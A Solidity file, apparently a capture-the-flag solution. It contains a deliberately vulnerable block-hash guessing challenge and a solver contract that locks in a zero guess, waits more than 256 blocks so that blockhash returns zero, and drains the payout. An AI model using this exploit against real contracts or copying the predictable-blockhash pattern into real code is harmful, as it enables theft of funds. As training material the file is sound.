/**
 *Submitted for verification at Etherscan.io on 2022-03-23
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract SolvePredictTheBlockHash {

    address predictTheBlockHashChallengeAddress = 0x6f79F11725E036D9fC85ED303c81DB42e86753c2;
    PredictTheBlockHashChallenge blockHashContract = PredictTheBlockHashChallenge(predictTheBlockHashChallengeAddress);
    address payoutAddress = 0;

    uint guessBlock = 0;
    bool isSolved = false;

    function () public payable { }

    function blockNotInMemoryTest() public view returns (bool) {

        // 0
        return block.blockhash(block.number - 257) == bytes32(uint(block.blockhash(block.number - 257)));

    }

    function makeGuess() public payable {
        require(msg.value == 1 ether);
        require(guessBlock == 0);

        payoutAddress = msg.sender;
        blockHashContract.lockInGuess.value(1 ether)(bytes32(0));
        guessBlock = block.number;
    }

    function hitContract() public returns(bool) {
        require(guessBlock != 0);
        require(block.number - guessBlock > 256);
        require(!isSolved);

        blockHashContract.settle();
        isSolved = true;
    }

    function withdrawAll() public returns(uint) {

        payoutAddress.transfer(address(this).balance);

        return address(this).balance;

    }


}